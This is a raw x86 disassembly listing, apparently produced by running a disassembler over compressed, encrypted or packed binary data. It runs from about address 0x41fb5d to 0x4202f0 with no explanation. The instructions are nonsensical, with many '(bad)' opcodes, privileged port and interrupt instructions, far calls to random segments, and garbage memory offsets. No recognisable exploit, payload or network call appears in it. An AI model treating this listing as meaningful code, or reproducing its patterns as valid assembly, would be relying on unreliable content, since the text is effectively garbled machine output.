  41fb5d:	mov    esp,DWORD PTR [eax+0x23abdc42]
  41fb63:	jno    0x41fb6e
  41fb65:	cmp    eax,0x85d29282
  41fb6a:	or     al,0x9a
  41fb6c:	sub    BYTE PTR [esi-0x50e544b],bh
  41fb72:	fwait
  41fb73:	cli    
  41fb74:	xchg   esi,eax
  41fb75:	mov    eax,ds:0x79cdd924
  41fb7a:	pusha  
  41fb7b:	icebp  
  41fb7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb7d:	mov    ebx,0xbe29d066
  41fb82:	mov    cl,0xfc
  41fb84:	div    BYTE PTR [eax+ecx*2]
  41fb87:	cmp    DWORD PTR [edi-0x6fcc59ae],esp
  41fb8d:	lock bound ebp,QWORD PTR [edx+0x7a]
  41fb91:	mov    edi,0x2448ad99
  41fb96:	inc    eax
  41fb97:	mov    esp,0x4aeab982
  41fb9c:	cli    
  41fb9d:	into   
  41fb9e:	div    ah
  41fba0:	lock into 
  41fba2:	xchg   BYTE PTR [edi-0x1a],cl
  41fba5:	jecxz  0x41fbab
  41fba7:	sbb    al,0x7d
  41fba9:	jge    0x41fbcc
  41fbab:	cmp    DWORD PTR [edx+0x406a805d],edi
  41fbb1:	adc    DWORD PTR [ebx],0xffffff9f
  41fbb4:	outs   dx,DWORD PTR ds:[esi]
  41fbb5:	rcl    ebp,1
  41fbb7:	bound  eax,QWORD PTR [esi+eax*1+0x27]
  41fbbb:	or     DWORD PTR [ebp-0x4bbd52bd],0x4c
  41fbc2:	dec    ebx
  41fbc3:	sbb    bh,BYTE PTR [ecx-0x1a8c1ff5]
  41fbc9:	xor    DWORD PTR [ebp+0x1bf090c4],ecx
  41fbcf:	mov    bl,0x4f
  41fbd1:	mov    ah,0x9f
  41fbd3:	sub    BYTE PTR [esi-0x56],bl
  41fbd6:	mov    dh,BYTE PTR [esi]
  41fbd8:	mov    al,ds:0x15beeef7
  41fbdd:	cmp    BYTE PTR [edx+0x3607ede9],bl
  41fbe3:	inc    ebx
  41fbe4:	mov    bh,0xb1
  41fbe6:	iret   
  41fbe7:	mov    dh,bl
  41fbe9:	lea    ebp,[esi-0x618ee862]
  41fbef:	inc    ebx
  41fbf0:	frstor [edi+0x15ce676e]
  41fbf6:	jb     0x41fc1a
  41fbf8:	out    dx,al
  41fbf9:	mov    cl,BYTE PTR ds:0xb416eb16
  41fbff:	imul   esp,DWORD PTR [ecx+0x5],0x4711b3aa
  41fc06:	lahf   
  41fc07:	push   ecx
  41fc08:	sub    bl,BYTE PTR [ecx]
  41fc0a:	call   0x27323a5a
  41fc0f:	fstp   DWORD PTR [ebx-0x1e3bc548]
  41fc15:	push   0x71ca839
  41fc1a:	mov    ds:0xf9ec5698,al
  41fc1f:	rol    DWORD PTR [ebp-0x1],cl
  41fc22:	js     0x41fbe7
  41fc24:	push   ecx
  41fc25:	and    al,0x27
  41fc27:	stc    
  41fc28:	xor    eax,0xabc356e5
  41fc2d:	inc    edx
  41fc2e:	pusha  
  41fc2f:	in     eax,0xfc
  41fc31:	xchg   ebp,eax
  41fc32:	sub    ah,BYTE PTR [eax+ebx*8+0x1f]
  41fc36:	xor    edx,ebp
  41fc38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc39:	ret    
  41fc3a:	lds    ebx,FWORD PTR [ecx+0x39]
  41fc3d:	pop    ss
  41fc3e:	mov    al,0x2d
  41fc40:	pushf  
  41fc41:	xor    DWORD PTR [edx-0x6d],eax
  41fc44:	test   BYTE PTR [ecx+edx*4-0x73],ch
  41fc48:	adc    al,0x74
  41fc4a:	aas    
  41fc4b:	jge    0x41fcc6
  41fc4d:	or     BYTE PTR [edi+0x67],cl
  41fc50:	push   edx
  41fc51:	ds dec edi
  41fc53:	pop    ebx
  41fc54:	adc    DWORD PTR [edi+0x41],ebx
  41fc57:	cdq    
  41fc58:	retf   0xcb5e
  41fc5b:	les    ecx,FWORD PTR [ebx]
  41fc5d:	int    0x3a
  41fc5f:	cmp    ch,ch
  41fc61:	mov    al,ds:0x7799c2d8
  41fc66:	fdivr  st(5),st
  41fc68:	jge    0x41fc9d
  41fc6a:	pop    eax
  41fc6b:	iret   
  41fc6c:	lahf   
  41fc6d:	sub    esp,edi
  41fc6f:	xor    BYTE PTR [ecx],bl
  41fc71:	push   ecx
  41fc72:	lods   al,BYTE PTR ds:[esi]
  41fc73:	push   edx
  41fc74:	test   al,0xe5
  41fc76:	inc    esp
  41fc77:	loop   0x41fceb
  41fc79:	inc    esp
  41fc7a:	cmp    DWORD PTR [edx],edi
  41fc7c:	mov    esi,ebx
  41fc7e:	out    0xaa,al
  41fc80:	fiadd  WORD PTR [eax-0x32]
  41fc83:	pop    edi
  41fc84:	pusha  
  41fc85:	cmp    cl,BYTE PTR [edx+eax*4+0x16]
  41fc89:	cmp    eax,0xdd84baaf
  41fc8e:	cs cli 
  41fc90:	cmp    eax,0x2f6c6195
  41fc95:	fcom   DWORD PTR [edi]
  41fc97:	aam    0x58
  41fc99:	mov    ebx,0xeb26e882
  41fc9e:	loope  0x41fcbc
  41fca0:	mov    edi,0x69b64e8c
  41fca5:	hlt    
  41fca6:	xchg   esi,eax
  41fca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fca8:	mov    al,ds:0x78cffb15
  41fcad:	imul   ebp,DWORD PTR [eax],0x551b6846
  41fcb3:	cwde   
  41fcb4:	push   ecx
  41fcb5:	retf   0xce7e
  41fcb8:	pop    ebp
  41fcb9:	dec    ebx
  41fcba:	ficomp DWORD PTR [ebx+0xf36f4cf]
  41fcc0:	fisttp WORD PTR [edx]
  41fcc2:	adc    DWORD PTR ds:0xc61c34e9,edi
  41fcc8:	ins    BYTE PTR es:[edi],dx
  41fcc9:	(bad)  
  41fcca:	mov    eax,0x7460b6ba
  41fccf:	fcomp  QWORD PTR [edi]
  41fcd1:	test   eax,0x9f62ee77
  41fcd6:	push   ecx
  41fcd7:	sub    eax,0x5e5e4c53
  41fcdc:	mov    edi,0xd7d68106
  41fce1:	adc    BYTE PTR [eax+edx*1-0x6e],0x66
  41fce6:	in     al,dx
  41fce7:	sub    dl,BYTE PTR [esi]
  41fce9:	cwde   
  41fcea:	ja     0x41fd69
  41fcec:	aam    0x98
  41fcee:	mov    bh,cl
  41fcf0:	xor    BYTE PTR [esi-0x412512b6],dh
  41fcf6:	xchg   ebp,eax
  41fcf7:	inc    eax
  41fcf8:	xor    al,0x6f
  41fcfa:	iret   
  41fcfb:	push   ebp
  41fcfc:	xchg   ebx,eax
  41fcfd:	dec    esp
  41fcfe:	and    eax,DWORD PTR [edx]
  41fd00:	pop    esp
  41fd01:	mov    ecx,0x35e816a4
  41fd06:	(bad)  
  41fd07:	mov    esp,0x2a559d03
  41fd0c:	jecxz  0x41fd1d
  41fd0e:	mov    ebp,0x3956b15a
  41fd13:	leave  
  41fd14:	sub    edi,DWORD PTR [edx+0xd]
  41fd17:	xchg   esi,eax
  41fd18:	pop    esp
  41fd19:	xchg   esp,eax
  41fd1a:	and    WORD PTR [ecx+0x52],sp
  41fd1e:	(bad)  
  41fd1f:	push   cs
  41fd20:	xchg   ebp,ebx
  41fd22:	push   edi
  41fd23:	xchg   DWORD PTR [esi],edi
  41fd25:	mov    dl,0xac
  41fd27:	out    dx,eax
  41fd28:	lods   al,BYTE PTR ds:[esi]
  41fd29:	out    0x75,eax
  41fd2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fd2c:	nop
  41fd2d:	loopne 0x41fd99
  41fd2f:	sub    eax,0x183ab17c
  41fd34:	or     al,0xa9
  41fd36:	outs   dx,DWORD PTR ds:[esi]
  41fd37:	jge    0x41fcec
  41fd39:	xor    esp,edx
  41fd3b:	fild   WORD PTR [ecx+0x492e5e7e]
  41fd41:	(bad)  
  41fd42:	jle    0x41fd09
  41fd44:	dec    esp
  41fd45:	dec    BYTE PTR [ebp+0x37cf3233]
  41fd4b:	dec    ebp
  41fd4c:	mov    ds:0x64ae3263,al
  41fd51:	daa    
  41fd52:	mov    eax,ds:0xa5875af5
  41fd57:	das    
  41fd58:	test   BYTE PTR [esi+0x325e1b4d],0x47
  41fd5f:	jo     0x41fd47
  41fd61:	stos   BYTE PTR es:[edi],al
  41fd62:	jg     0x41fdab
  41fd64:	bound  ebp,QWORD PTR [ecx]
  41fd66:	sahf   
  41fd67:	push   edx
  41fd68:	ds jmp 0x5346aec8
  41fd6e:	stc    
  41fd6f:	jl     0x41fd51
  41fd71:	ss mov edx,0xeee3310d
  41fd77:	cdq    
  41fd78:	xor    esp,esi
  41fd7a:	stos   DWORD PTR es:[edi],eax
  41fd7b:	loop   0x41fdb3
  41fd7d:	add    eax,0x527a81a2
  41fd82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fd83:	js     0x41fdd7
  41fd85:	dec    ebx
  41fd86:	add    BYTE PTR [edi-0x12e7ee6b],ch
  41fd8c:	pop    es
  41fd8d:	pop    edx
  41fd8e:	test   ebp,esi
  41fd90:	shl    dl,cl
  41fd92:	add    edx,ebx
  41fd94:	mov    bh,BYTE PTR [eax+eiz*8]
  41fd97:	loope  0x41fe15
  41fd99:	je     0x41fd33
  41fd9b:	push   eax
  41fd9c:	dec    edx
  41fd9d:	jge    0x41fdeb
  41fd9f:	adc    BYTE PTR [eax+0x1a851164],bl
  41fda5:	and    al,0x9c
  41fda7:	loop   0x41fdd9
  41fda9:	adc    eax,0x90e1ac1a
  41fdae:	cmp    eax,0xb9bce0b3
  41fdb3:	ss pop ecx
  41fdb5:	imul   edx,DWORD PTR [ecx],0xed059552
  41fdbb:	setp   al
  41fdbe:	(bad)  
  41fdbf:	(bad)
  41fdc2:	mov    esp,0xaaed0aa9
  41fdc7:	les    esi,FWORD PTR [ebx]
  41fdc9:	cwde   
  41fdca:	jg     0x41fdcd
  41fdcc:	imul   eax,DWORD PTR [edi],0x6de279ee
  41fdd2:	pop    ecx
  41fdd3:	adc    DWORD PTR [ecx-0x3a6b6d16],0x6f
  41fdda:	test   BYTE PTR [esi+eiz*2],ch
  41fddd:	dec    ecx
  41fdde:	data16 cmp al,0xbf
  41fde1:	mov    eax,0x69819881
  41fde6:	call   0xd537:0xa386835d
  41fded:	popf   
  41fdee:	sub    dl,BYTE PTR [esi-0x5f]
  41fdf1:	push   ss
  41fdf2:	cmc    
  41fdf3:	(bad)  
  41fdf4:	sub    DWORD PTR [eax+0x4b908eb2],ecx
  41fdfa:	sti    
  41fdfb:	push   ebp
  41fdfc:	jmp    0x41fe70
  41fdfe:	ins    BYTE PTR es:[edi],dx
  41fdff:	push   0x20
  41fe01:	jmp    0x3590596a
  41fe06:	cdq    
  41fe07:	sub    BYTE PTR [ebx+0x3e175cac],0x5a
  41fe0e:	cmp    eax,0x4c9d37db
  41fe13:	pushf  
  41fe14:	mov    eax,ds:0xe6ace9da
  41fe19:	stos   DWORD PTR es:[edi],eax
  41fe1a:	xchg   edx,eax
  41fe1b:	push   esi
  41fe1c:	adc    esp,edi
  41fe1e:	mov    al,ds:0x2ba5ee40
  41fe23:	pusha  
  41fe24:	add    DWORD PTR [eax],ebp
  41fe26:	cmp    eax,DWORD PTR [ebx+edx*2]
  41fe29:	adc    al,0x9d
  41fe2b:	outs   dx,DWORD PTR ds:[esi]
  41fe2c:	xchg   edi,eax
  41fe2d:	std    
  41fe2e:	gs addr16 hlt 
  41fe31:	loope  0x41fe4f
  41fe33:	cmp    bh,BYTE PTR [eax-0x33]
  41fe36:	mov    bl,0x4f
  41fe38:	cdq    
  41fe39:	loope  0x41fe17
  41fe3b:	sahf   
  41fe3c:	mov    DWORD PTR [edx-0x7aa3ec22],eax
  41fe42:	lods   eax,DWORD PTR ds:[esi]
  41fe44:	bound  ecx,QWORD PTR [edx]
  41fe46:	or     ebp,0xffffff96
  41fe49:	call   0x5183:0xa755a5b8
  41fe50:	mov    DWORD PTR ds:0x336c54a7,ecx
  41fe56:	mov    ah,0xdb
  41fe58:	mov    al,ds:0xafbb0a59
  41fe5d:	jecxz  0x41fe37
  41fe5f:	mov    esp,0xab4152e8
  41fe64:	in     eax,dx
  41fe65:	loope  0x41fe57
  41fe67:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe68:	(bad)  
  41fe69:	fisttp QWORD PTR [edi-0x72]
  41fe6c:	mov    ch,0xf2
  41fe6e:	icebp  
  41fe6f:	out    0x3,al
  41fe71:	mov    bl,0x88
  41fe73:	add    al,BYTE PTR [edx-0x1a854fdf]
  41fe79:	jge    0x41fe4c
  41fe7b:	icebp  
  41fe7c:	loopne 0x41fe77
  41fe7e:	popf   
  41fe7f:	and    eax,0x6b30bfa7
  41fe84:	mov    cl,0xf8
  41fe86:	repz cmp dl,bl
  41fe89:	(bad)  
  41fe8a:	jl     0x41fec7
  41fe8c:	cmc    
  41fe8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe8e:	push   edi
  41fe8f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41fe91:	into   
  41fe92:	enter  0x9b6d,0xb2
  41fe96:	ds push ebx
  41fe98:	cmp    BYTE PTR [edi+esi*4+0x6cb651bc],ch
  41fe9f:	das    
  41fea0:	mov    DWORD PTR [ecx+ebp*2+0x19],esi
  41fea4:	ss mov al,0x6f
  41fea7:	inc    ecx
  41fea8:	or     al,0x5
  41feaa:	out    0x16,eax
  41feac:	fidiv  WORD PTR [edx+0x2e4e2b0d]
  41feb2:	rcl    dl,0x99
  41feb5:	retf   
  41feb6:	xchg   ebx,eax
  41feb7:	imul   ebx,DWORD PTR [esi+0x787b7a32],0x47c38957
  41fec1:	out    0x72,al
  41fec3:	out    0xd5,al
  41fec5:	shl    DWORD PTR [ebp+0x40f74142],1
  41fecb:	pop    eax
  41fecc:	stos   DWORD PTR es:[edi],eax
  41fecd:	sub    BYTE PTR [edi-0x3dcca004],dl
  41fed3:	(bad)  
  41fed4:	mov    ecx,0x84f4de5f
  41fed9:	pop    esi
  41feda:	jg     0x41fe68
  41fedc:	loope  0x41fe5f
  41fede:	sbb    BYTE PTR [edi-0x2a],dl
  41fee1:	or     esi,0xb82dce58
  41fee7:	pop    esp
  41fee8:	call   DWORD PTR [edx+0x44]
  41feeb:	sub    eax,0x9e76814b
  41fef0:	push   esp
  41fef1:	dec    esp
  41fef2:	mov    ds:0x3fa5f77,eax
  41fef7:	dec    eax
  41fef8:	sti    
  41fef9:	psubd  mm7,QWORD PTR [edx]
  41fefc:	sar    edi,0x38
  41feff:	cmp    cl,BYTE PTR [ebp-0x47]
  41ff02:	ds mov dh,0xf5
  41ff05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff06:	pop    esi
  41ff07:	rcr    BYTE PTR [eax],0x66
  41ff0a:	cmc    
  41ff0b:	(bad)  
  41ff0c:	push   ds
  41ff0d:	push   ebp
  41ff0e:	rol    DWORD PTR [edi+0x20],1
  41ff11:	cmp    DWORD PTR [eax-0x7d],ecx
  41ff14:	out    dx,eax
  41ff15:	ins    BYTE PTR es:[edi],dx
  41ff16:	imul   eax,DWORD PTR [ebp-0x6fd7164f],0x1
  41ff1d:	sbb    eax,0xe462a485
  41ff22:	cmp    BYTE PTR [ebp-0x5b66d8ff],dl
  41ff28:	(bad)  
  41ff29:	aas    
  41ff2a:	jmp    0x167dc9b
  41ff2f:	shl    ebx,1
  41ff31:	lea    esi,[ebx-0x49039685]
  41ff37:	leave  
  41ff38:	(bad)  
  41ff39:	imul   ecx
  41ff3b:	adc    BYTE PTR ds:0xee914b2c,al
  41ff41:	popf   
  41ff42:	and    ah,dl
  41ff44:	sub    al,0x97
  41ff46:	dec    ecx
  41ff47:	jle    0x41ff3f
  41ff49:	adc    DWORD PTR [edi+0x93f57aa],eax
  41ff4f:	pop    edi
  41ff50:	add    al,0xdf
  41ff52:	mov    edx,0x393df628
  41ff57:	cmp    al,0x1e
  41ff59:	stos   BYTE PTR es:[edi],al
  41ff5a:	jle    0x41ff9f
  41ff5c:	cs cmp eax,0xafc31032
  41ff62:	mov    ds:0x67cda978,eax
  41ff67:	mov    al,ds:0xc45f06
  41ff6c:	out    dx,al
  41ff6d:	rcr    BYTE PTR [ecx-0x7b],0x69
  41ff71:	js     0x41ff3e
  41ff73:	push   es
  41ff74:	inc    eax
  41ff75:	out    dx,eax
  41ff76:	fs push ebp
  41ff78:	dec    edx
  41ff79:	(bad)  
  41ff7a:	lahf   
  41ff7b:	jge    0x41ff11
  41ff7d:	repz jl 0x41ff96
  41ff80:	pop    ebp
  41ff81:	shl    BYTE PTR [esi],cl
  41ff83:	xchg   ebp,eax
  41ff84:	daa    
  41ff85:	adc    DWORD PTR [ecx-0x49],edx
  41ff88:	sbb    DWORD PTR [esi-0x7d],edi
  41ff8b:	ja     0x41ff46
  41ff8d:	inc    edx
  41ff8e:	fwait
  41ff8f:	popf   
  41ff90:	and    edi,DWORD PTR [ebx]
  41ff92:	loope  0x41ffa6
  41ff94:	mov    ebp,0x87481e7d
  41ff99:	lods   al,BYTE PTR ds:[esi]
  41ff9a:	xchg   edx,eax
  41ff9b:	sbb    ecx,DWORD PTR [esi+0x49]
  41ff9e:	test   eax,0x19a2b3e4
  41ffa3:	bound  edi,QWORD PTR [ebx+0x10963da5]
  41ffa9:	cmp    ebp,DWORD PTR [eax-0x3f]
  41ffac:	mov    esp,0x35ce3052
  41ffb1:	jno    0x41ff45
  41ffb3:	int    0xe0
  41ffb5:	rep stos BYTE PTR es:[edi],al
  41ffb7:	mov    ds:0x3b7c38a,al
  41ffbc:	cmp    dh,BYTE PTR [ecx]
  41ffbe:	adc    al,BYTE PTR [edi-0x6]
  41ffc1:	fistp  DWORD PTR [ebx+0x70]
  41ffc4:	adc    ch,BYTE PTR [edi]
  41ffc6:	stos   DWORD PTR es:[edi],eax
  41ffc7:	adc    eax,0x1df44ced
  41ffcc:	mov    WORD PTR [eax],fs
  41ffce:	pop    ss
  41ffcf:	sub    al,BYTE PTR [edi-0x34]
  41ffd2:	(bad)  
  41ffd3:	ds cli 
  41ffd5:	lock xchg ebx,eax
  41ffd7:	dec    edx
  41ffd8:	pop    esp
  41ffd9:	in     al,dx
  41ffda:	cmp    bl,dl
  41ffdc:	es push ebx
  41ffde:	mov    BYTE PTR [edx+0x67b15fa3],dl
  41ffe4:	call   0xec25:0x3b7e6f6f
  41ffeb:	sub    BYTE PTR [ebp+eax*1-0x380204fe],ch
  41fff2:	pop    ds
  41fff3:	test   eax,0x870a7cd4
  41fff8:	test   BYTE PTR [esi+0x605dd6ad],bl
  41fffe:	outs   dx,BYTE PTR ds:[esi]
  41ffff:	sbb    bh,bl
  420001:	bound  esi,QWORD PTR [edi+0x34]
  420004:	loopne 0x420047
  420006:	call   0x3273:0x236c4ada
  42000d:	(bad)  
  42000e:	loopne 0x420050
  420010:	std    
  420011:	shr    bl,0x47
  420014:	jle    0x41ffed
  420016:	sti    
  420017:	adc    edx,DWORD PTR ds:0x23236ecc
  42001d:	jmp    0xd6e0:0xe3c39284
  420024:	mov    bh,BYTE PTR fs:[edi-0x55]
  420028:	mov    edx,0xd348fa7e
  42002d:	pop    ecx
  42002e:	mov    edi,0x60382b94
  420033:	adc    cl,0x26
  420036:	jmp    0x24f3:0x2a13ea16
  42003d:	sti    
  42003e:	inc    esp
  42003f:	xchg   edi,eax
  420040:	and    ebx,DWORD PTR [ebx+ecx*8-0x585dfc4b]
  420047:	scas   al,BYTE PTR es:[edi]
  420048:	je     0x4200b7
  42004a:	sub    BYTE PTR [ebx-0x40e3a1f0],ah
  420050:	ds dec esi
  420052:	shl    BYTE PTR [edi+0x47],0x79
  420056:	rol    edx,1
  420058:	jo     0x41fff1
  42005a:	addr16 mov eax,0x8e073e2f
  420060:	push   esi
  420061:	mov    al,0x61
  420063:	push   ebx
  420064:	mov    ecx,0x95041d53
  420069:	cmp    eax,0x61d18c11
  42006e:	and    edx,esp
  420070:	into   
  420071:	or     DWORD PTR [esi],esi
  420073:	mov    cl,0x1f
  420075:	dec    edi
  420076:	jecxz  0x420028
  420078:	bound  esp,QWORD PTR [ebp-0x4a73b]
  42007e:	inc    ebx
  42007f:	push   esp
  420080:	inc    edx
  420081:	pop    edi
  420082:	push   edi
  420083:	pop    es
  420084:	mov    esp,0x80f326df
  420089:	int3   
  42008a:	sbb    eax,0x172419ec
  42008f:	xchg   ecx,eax
  420090:	pop    ebx
  420091:	sub    eax,ebp
  420093:	inc    eax
  420094:	enter  0x46f1,0xda
  420098:	or     ebx,DWORD PTR [edx]
  42009a:	dec    ebp
  42009b:	mov    ebx,0x972a6e68
  4200a0:	mov    esp,0x5affe041
  4200a5:	dec    ecx
  4200a6:	xor    BYTE PTR [eax],0x6e
  4200a9:	imul   DWORD PTR [ecx*1+0x708e8ce8]
  4200b0:	add    al,BYTE PTR [ebx+0x7f]
  4200b3:	test   al,0x81
  4200b5:	pop    esi
  4200b6:	xchg   BYTE PTR [edx],dl
  4200b8:	and    cl,al
  4200ba:	push   ecx
  4200bb:	popa   
  4200bc:	fild   QWORD PTR [edi]
  4200be:	inc    esi
  4200bf:	data16 arpl WORD PTR [ecx],bx
  4200c2:	mov    bh,0x3b
  4200c4:	or     eax,0x2a612dfc
  4200c9:	push   es
  4200ca:	xchg   edx,eax
  4200cb:	test   DWORD PTR [eax-0x2dc3ecda],esp
  4200d1:	push   ebx
  4200d2:	cld    
  4200d3:	mov    ecx,0x4f0c26aa
  4200d8:	adc    BYTE PTR [esi+0x26],cl
  4200db:	mov    dh,0xfa
  4200dd:	outs   dx,BYTE PTR ds:[esi]
  4200de:	pop    esp
  4200df:	cli    
  4200e0:	and    al,dh
  4200e2:	pop    ss
  4200e3:	enter  0xe9cd,0xb6
  4200e7:	leave  
  4200e8:	or     dh,dh
  4200ea:	or     DWORD PTR [ebx-0x75ecf1fd],0x72
  4200f1:	pop    esp
  4200f2:	cld    
  4200f3:	aam    0x3b
  4200f5:	push   0x18
  4200f7:	test   DWORD PTR [ebp-0x6f],0x31d9a71
  4200fe:	mov    esi,0x6bfaa221
  420103:	inc    ebp
  420104:	push   cs
  420105:	mov    eax,ds:0x349f5085
  42010a:	out    dx,eax
  42010b:	loopne 0x420184
  42010d:	jno    0x420178
  42010f:	lods   al,BYTE PTR ds:[esi]
  420110:	cld    
  420111:	inc    ebp
  420112:	fwait
  420113:	dec    ebx
  420114:	adc    eax,DWORD PTR [edx]
  420116:	mov    ecx,tr4
  420119:	xchg   ebx,eax
  42011a:	jmp    0xc776:0xb3e4fb6d
  420121:	ror    ch,0x5
  420124:	js     0x4200b1
  420126:	loopne 0x42014a
  420128:	ret    0x5f44
  42012b:	inc    esp
  42012c:	(bad)  
  42012d:	mov    esp,0xb4dbce74
  420132:	bound  esp,QWORD PTR [ebp+0xf7013c5]
  420138:	call   0xfcca:0x94ac93fa
  42013f:	pop    ebp
  420140:	jns    0x4200ec
  420142:	cdq    
  420143:	mov    DWORD PTR [edx+esi*1],edx
  420146:	pop    ebx
  420147:	aas    
  420148:	ja     0x420162
  42014a:	por    mm5,mm5
  42014d:	popf   
  42014e:	dec    ebx
  42014f:	mov    ecx,0xdee25480
  420154:	inc    ebx
  420155:	cld    
  420156:	sbb    al,0x76
  420158:	push   edx
  420159:	mov    ecx,0x4bbbad87
  42015e:	in     eax,dx
  42015f:	(bad)  
  420161:	xchg   esi,eax
  420162:	int3   
  420163:	fwait
  420164:	pusha  
  420165:	fwait
  420166:	cmp    DWORD PTR [ecx-0x208be5d6],0xcc6be604
  420170:	xchg   esi,ecx
  420172:	dec    ecx
  420173:	lds    ecx,FWORD PTR [eax+0x3c3f786e]
  420179:	or     BYTE PTR [esi+0x673c69ca],dl
  42017f:	mov    dh,0x92
  420181:	jl     0x4201ca
  420183:	int3   
  420184:	repz bnd js 0x42016a
  420188:	loopne 0x42017f
  42018a:	inc    ecx
  42018b:	stos   DWORD PTR es:[edi],eax
  42018c:	frstor [edx-0x45]
  42018f:	xor    ecx,DWORD PTR [edx+edx*8]
  420192:	popf   
  420193:	add    al,ah
  420195:	in     al,dx
  420196:	out    dx,al
  420197:	lods   eax,DWORD PTR ds:[esi]
  420198:	jns    0x420209
  42019a:	xchg   ebp,ebx
  42019c:	call   0x5a09:0x48810821
  4201a3:	addr16 ja 0x4201ba
  4201a6:	mov    ebp,0xfa7671c7
  4201ab:	ins    DWORD PTR es:[edi],dx
  4201ac:	mov    bl,0xb8
  4201ae:	shl    DWORD PTR [edi-0x1d],1
  4201b1:	and    ah,BYTE PTR [ecx+eax*2-0xe]
  4201b5:	test   BYTE PTR [edx-0x50],ch
  4201b8:	push   ss
  4201b9:	iret   
  4201ba:	push   0x33b3af1d
  4201bf:	stos   DWORD PTR es:[edi],eax
  4201c0:	pop    eax
  4201c1:	sub    DWORD PTR [eax-0x2a],esp
  4201c4:	scas   eax,DWORD PTR es:[edi]
  4201c5:	stc    
  4201c6:	or     al,0xb5
  4201c8:	imul   ebp
  4201ca:	xchg   ebp,eax
  4201cb:	add    al,BYTE PTR [esi+ecx*4-0x5db450dc]
  4201d2:	jecxz  0x4201e4
  4201d4:	adc    ebx,DWORD PTR [ecx]
  4201d6:	lods   al,BYTE PTR ds:[esi]
  4201d7:	cmp    BYTE PTR [ebx-0x7761d2b3],al
  4201dd:	outs   dx,DWORD PTR ds:[esi]
  4201de:	sbb    edx,DWORD PTR [edx]
  4201e0:	pop    edx
  4201e1:	inc    ebx
  4201e2:	and    al,0xda
  4201e4:	int3   
  4201e5:	inc    esp
  4201e6:	mov    cs,edx
  4201e8:	out    0x4c,eax
  4201ea:	sbb    al,0x4c
  4201ec:	cwde   
  4201ed:	daa    
  4201ee:	add    BYTE PTR [ecx-0x64d25f82],dh
  4201f4:	(bad)  
  4201f6:	outs   dx,BYTE PTR ds:[esi]
  4201f7:	push   eax
  4201f8:	adc    DWORD PTR [ebp-0x6f19d292],0x46
  4201ff:	mov    dh,0x38
  420201:	pop    ecx
  420202:	mov    al,ds:0xb6f5203e
  420207:	and    eax,0xce82144
  42020c:	shr    eax,cl
  42020e:	ja     0x420273
  420210:	aam    0xa0
  420212:	scas   al,BYTE PTR es:[edi]
  420213:	ds mov dh,0x82
  420216:	clc    
  420217:	cwde   
  420218:	xor    al,0x33
  42021a:	add    al,0x1e
  42021c:	and    BYTE PTR [esi+0xc],ah
  42021f:	sahf   
  420220:	pop    ecx
  420221:	push   esp
  420222:	and    al,0xa0
  420224:	mov    esi,0xdaf61bcf
  420229:	mov    ch,BYTE PTR [ebp+ebx*8-0x43]
  42022d:	jle    0x420226
  42022f:	cs mov dl,0x30
  420232:	sbb    al,0x92
  420234:	sahf   
  420235:	push   cs
  420236:	mov    ecx,0xa8986f7f
  42023b:	mov    esi,0x1a6adc6c
  420240:	xchg   edx,eax
  420241:	mov    dh,0xb
  420243:	mov    al,0xe0
  420245:	je     0x4201e7
  420247:	mov    cl,0x73
  420249:	inc    esi
  42024a:	dec    esi
  42024b:	out    dx,eax
  42024c:	repnz sbb esp,DWORD PTR [ecx+0x61]
  420250:	or     ebx,edx
  420252:	sbb    eax,0x1df41853
  420257:	sar    BYTE PTR [ebx+0xb4e40c8],0x2d
  42025e:	and    esp,0x73
  420261:	stos   BYTE PTR es:[edi],al
  420262:	add    DWORD PTR [ebx-0x7b],0xf84b1e4e
  420269:	xor    dh,ah
  42026b:	div    edi
  42026d:	push   edi
  42026e:	push   0xffffffb4
  420270:	std    
  420271:	pusha  
  420272:	inc    edi
  420273:	mov    ch,0xb2
  420275:	fist   DWORD PTR [edx]
  420277:	hlt    
  420278:	in     eax,0x83
  42027a:	ror    BYTE PTR [eax-0x2e30391d],1
  420280:	xor    DWORD PTR ds:[eax+ecx*2],ecx
  420284:	pop    ss
  420285:	xor    BYTE PTR [ebp-0x20],bl
  420288:	pop    esp
  420289:	jmp    0x420233
  42028b:	pop    esi
  42028c:	pop    eax
  42028d:	or     al,0xc8
  42028f:	or     al,0x3d
  420291:	push   0xffffffa5
  420293:	push   0xffffffa8
  420295:	or     BYTE PTR [ecx+0x47],0xb1
  420299:	(bad)  
  42029a:	jge    0x4202e8
  42029c:	cld    
  42029d:	aaa    
  42029e:	push   edi
  42029f:	je     0x42022f
  4202a1:	in     al,0x28
  4202a3:	add    edx,esi
  4202a5:	push   ebp
  4202a6:	dec    esi
  4202a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4202a8:	jle    0x420236
  4202aa:	cmp    eax,0x8a7b3754
  4202af:	scas   al,BYTE PTR es:[edi]
  4202b0:	sub    esi,DWORD PTR [ecx+0x32]
  4202b3:	fabs   
  4202b5:	dec    edi
  4202b6:	lahf   
  4202b7:	add    BYTE PTR [edx],cl
  4202b9:	loope  0x4202b1
  4202bb:	icebp  
  4202bc:	or     bl,bl
  4202be:	rcl    DWORD PTR [edi+0x9f28ed8],1
  4202c4:	xchg   edx,eax
  4202c5:	fisttp QWORD PTR [edi]
  4202c7:	(bad)  
  4202c8:	loop   0x42024a
  4202ca:	pop    ebx
  4202cb:	stc    
  4202cc:	mov    bh,0x21
  4202ce:	inc    edi
  4202cf:	inc    edi
  4202d0:	adc    al,0x28
  4202d2:	xchg   edi,eax
  4202d3:	ja     0x420311
  4202d5:	jl     0x4202e7
  4202d7:	cmp    al,0x1
  4202d9:	adc    esp,DWORD PTR [edx]
  4202db:	add    BYTE PTR [esi],bh
  4202dd:	inc    eax
  4202de:	fist   WORD PTR [ebx-0x9]
  4202e1:	sbb    eax,0xc0a5f9ff
  4202e6:	xchg   edi,eax
  4202e7:	loopne 0x42031e
  4202e9:	(bad)  
  4202ea:	xchg   ebx,eax
  4202eb:	fwait
  4202ec:	(bad)  
  4202ed:	fnstcw WORD PTR [eax+0x24]
  4202f0:	dec    esi
